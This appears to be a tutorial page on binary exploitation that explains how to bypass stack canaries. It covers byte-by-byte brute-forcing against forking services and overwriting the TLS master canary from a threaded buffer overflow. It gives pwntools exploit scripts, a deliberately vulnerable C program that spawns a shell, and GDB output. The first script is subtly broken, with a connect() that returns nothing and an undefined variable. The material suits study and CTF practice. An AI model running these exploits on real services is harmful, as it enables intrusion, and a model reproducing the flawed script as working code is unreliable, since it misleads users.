**If you are facing a binary protected by a canary and PIE (Position Independent Executable) you probably need to find a way to bypass them.**

![](<../../../../.gitbook/assets/image (144).png>)

{% hint style="info" %}
Note that **`checksec`** might not find that a binary is protected by a canary if this was statically compiled and it's not capable to identify the function.\
However, you can manually notice this if you find that a value is saved in the stack at the beginning of a function call and this value is checked before exiting.

## Brute force Canary

The best way to bypass a simple canary is if the binary is a program **forking child processes every time you establish a new connection** with it (network service), because every time you connect to it **the same canary will be used**.

Then, the best way to bypass the canary is just to **brute-force it char by char**, and you can figure out if the guessed canary byte was correct checking if the program has crashed or continues its regular flow. In this example the function **brute-forces an 8 Bytes canary (x64)** and distinguish between a correct guessed byte and a bad byte just **checking** if a **response** is sent back by the server (another way in **other situation** could be using a **try/except**):

### Example 1

This example is implemented for 64bits but could be easily implemented for 32 bits.

```python
from pwn import *

def connect():
    r = remote("localhost", 8788)

def get_bf(base):
    canary = ""
    guess = 0x0
    base += canary

    while len(canary) < 8:
        while guess != 0xff:
            r = connect()

            r.recvuntil("Username: ")
            r.send(base + chr(guess))

            if "SOME OUTPUT" in r.clean():
                print "Guessed correct byte:", format(guess, '02x')
                canary += chr(guess)
                base += chr(guess)
                guess = 0x0
                r.close()
                break
            else:
                guess += 1
                r.close()

    print "FOUND:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in canary)
    return base
    
canary_offset = 1176
base = "A" * canary_offset
print("Brute-Forcing canary")
base_canary = get_bf(base) #Get yunk data + canary
CANARY = u64(base_can[len(base_canary)-8:]) #Get the canary
```

### Example 2

This is implemented for 32 bits, but this could be easily changed to 64bits.\
Also note that for this example the **program expected first a byte to indicate the size of the input** and the payload.

```python
from pwn import *

# Here is the function to brute force the canary
def breakCanary():
	known_canary = b""
	test_canary = 0x0
	len_bytes_to_read = 0x21
	
	for j in range(0, 4):
		# Iterate up to 0xff times to brute force all posible values for byte
		for test_canary in range(0xff):
			print(f"\rTrying canary: {known_canary} {test_canary.to_bytes(1, 'little')}", end="")
			
			# Send the current input size
			target.send(len_bytes_to_read.to_bytes(1, "little"))

			# Send this iterations canary
			target.send(b"0"*0x20 + known_canary + test_canary.to_bytes(1, "little"))

			# Scan in the output, determine if we have a correct value
			output = target.recvuntil(b"exit.")
			if b"YUM" in output:
				# If we have a correct value, record the canary value, reset the canary value, and move on
				print(" - next byte is: " + hex(test_canary))
				known_canary = known_canary + test_canary.to_bytes(1, "little")
				len_bytes_to_read += 1
				break

	# Return the canary
	return known_canary

# Start the target process
target = process('./feedme')
#gdb.attach(target)

# Brute force the canary
canary = breakCanary()
log.info(f"The canary is: {canary}")
```

## Threads

Threads of the same process will also **share the same canary token**, therefore it'll be possible to **brute-force** a canary if the binary spawns a new thread every time an attack happens.&#x20;

A buffer overflow in a threaded function protected with canary can be used to modify the master canary of the process. As a result, the mitigation is useless because the check is used with two canaries that are the same (although modified).

### Example

The following program is vulnerable to Buffer Overflow, but it is compiled with canary:

```c
#include <pthread.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

// gcc thread_canary.c -no-pie -l pthread -o thread_canary

void win() {
    execve("/bin/sh", NULL, NULL);
}

void* vuln() {
    char data[0x20];
    gets(data);
}

int main() {
    pthread_t thread;

    pthread_create(&thread, NULL, vuln, NULL);
    pthread_join(thread, NULL);

    return 0;
}
```

Notice that `vuln` is called inside a thread. In GDB we can take a look at `vuln`, specifically, at the point where the program calls `gets` to read input data:

```bash
gef> break gets
Breakpoint 1 at 0x4010a0
gef> run
...
gef> x/10gx $rdi
0x7ffff7d7ee20: 0x0000000000000000      0x0000000000000000
0x7ffff7d7ee30: 0x0000000000000000      0x0000000000000000
0x7ffff7d7ee40: 0x0000000000000000      0x493fdc653a156800
0x7ffff7d7ee50: 0x0000000000000000      0x00007ffff7e17ac3
0x7ffff7d7ee60: 0x0000000000000000      0x00007ffff7d7f640
```

The above represents the address of `data`, where the program will write user input. The stack canary is found at `0x7ffff7d7ee48` (`0x493fdc653a156800`), and the return address is at `0x7ffff7d7ee50` (`0x00007ffff7e17ac3`):

```bash
gef> telescope $rdi 8 -n
0x7ffff7d7ee20|+0x0000|+000: 0x0000000000000000  <-  $rdi
0x7ffff7d7ee28|+0x0008|+001: 0x0000000000000000
0x7ffff7d7ee30|+0x0010|+002: 0x0000000000000000
0x7ffff7d7ee38|+0x0018|+003: 0x0000000000000000
0x7ffff7d7ee40|+0x0020|+004: 0x0000000000000000
0x7ffff7d7ee48|+0x0028|+005: 0x493fdc653a156800  <-  canary
0x7ffff7d7ee50|+0x0030|+006: 0x0000000000000000  <-  $rbp
0x7ffff7d7ee58|+0x0038|+007: 0x00007ffff7e17ac3 <start_thread+0x2f3>  ->  0xe8ff31fffffe6fe9  <-  retaddr[2]
```

Notice that the stack addresses do not belong to the actual stack:

```bash
gef> vmmap stack
[ Legend:  Code | Heap | Stack | Writable | ReadOnly | None | RWX ]
Start              End                Size               Offset             Perm Path
0x00007ffff7580000 0x00007ffff7d83000 0x0000000000803000 0x0000000000000000 rw- <tls-th1><stack-th2>  <-  $rbx, $rsp, $rbp, $rsi, $rdi, $r12
0x00007ffffffde000 0x00007ffffffff000 0x0000000000021000 0x0000000000000000 rw- [stack]  <-  $r9, $r15
```

The thread's stack is placed above the Thread Local Storage (TLS), where the master canary is stored:

```bash
gef> tls
$tls = 0x7ffff7d7f640
...
---------------------------------------------------------------------------- TLS ----------------------------------------------------------------------------
0x7ffff7d7f640|+0x0000|+000: 0x00007ffff7d7f640  ->  [loop detected]  <-  $rbx, $r12
0x7ffff7d7f648|+0x0008|+001: 0x00000000004052b0  ->  0x0000000000000001
0x7ffff7d7f650|+0x0010|+002: 0x00007ffff7d7f640  ->  [loop detected]
0x7ffff7d7f658|+0x0018|+003: 0x0000000000000001
0x7ffff7d7f660|+0x0020|+004: 0x0000000000000000
0x7ffff7d7f668|+0x0028|+005: 0x493fdc653a156800  <-  canary
0x7ffff7d7f670|+0x0030|+006: 0xb79b79966e9916c4  <-  PTR_MANGLE cookie
0x7ffff7d7f678|+0x0038|+007: 0x0000000000000000
...
```

{% hint style="info" %}
Some of the above GDB functions are defined on an extension called [bata24/gef](https://github.com/bata24/gef), which has more features than the usual [hugsy/gef](https://github.com/hugsy/gef).
{% endhint %}

As a result, a large Buffer Overflow can allow to modify both the stack canary and the master canary in the TLS. This is the offset:

```bash
gef> p/x 0x7ffff7d7f668 - $rdi
$1 = 0x848
```

This is a short exploit to call `win`:

```python
from pwn import *

context.binary = 'thread_canary'

payload  = b'A' * 0x28                    # buffer overflow offset
payload += b'BBBBBBBB'                    # overwritting stack canary
payload += b'A' * 8                       # saved $rbp
payload += p64(context.binary.sym.win)    # return address
payload += b'A' * (0x848 - len(payload))  # padding
payload += b'BBBBBBBB'                    # overwritting master canary

io = context.binary.process()
io.sendline(payload)
io.interactive()
```
